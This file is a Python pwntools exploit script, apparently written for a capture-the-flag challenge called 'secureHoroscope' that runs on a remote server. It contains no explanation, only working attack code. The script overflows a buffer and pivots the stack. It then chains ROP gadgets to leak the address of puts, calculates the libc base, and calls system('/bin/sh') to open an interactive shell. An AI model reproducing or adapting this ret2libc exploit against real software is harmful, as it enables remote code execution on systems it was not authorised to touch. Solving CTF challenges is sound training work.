from pwn import *

exe = ELF("secureHoroscope_patched")
exe_rop = ROP(exe)
libc = ELF("libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
# context.log_level = 'DEBUG'

def log_print(*msg):
    log.info(" ".join(map(str,msg)))

def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            input("Wait r2 attach")
    else:
        r = remote("sechoroscope.sdc.tf", 1337)
    return r

ret_addr = exe_rop.find_gadget(['ret'])[0]
pop_rdi_ret_addr = exe_rop.find_gadget(['pop rdi', 'ret'])[0]

io = start()
io.sendlineafter(b'feel\n',b"AAAAA")

writable = 0x601900

print(hex(exe.sym["puts"]))
# print(hex(exe.got["puts"]))
input("wait")
io.sendlineafter(b'horoscope\n\n',flat({
    0x70:writable,
    0x70+8:0x004007b9
}))
io.recvuntil(b"business days.\n")

input("wait")
io.send(flat({
    0:[
        writable-0x70 + 0x8*5,# new rbp
        pop_rdi_ret_addr,
        exe.got["puts"],
        exe.sym["puts"],
        0x004007fd, # fflush, leave ret
        writable-0x70 + 0x8*5 +0x8 + 0x70, # rbp
        0x004007cf,
    ],
    0x70:writable-0x70,
    0x70+8:0x0040080d # leave ret
}))
io.recvuntil(b"business days.\n")
libc.address = int.from_bytes(io.recvuntil(b"\n",drop=True),"little") - libc.sym["puts"]
log_print("base libc addr",hex(libc.address))
input("wait")
io.send(flat({
    0:[
        pop_rdi_ret_addr,
        next(libc.search(b"/bin/sh")),
        libc.sym["system"]
    ],

}))
io.interactive()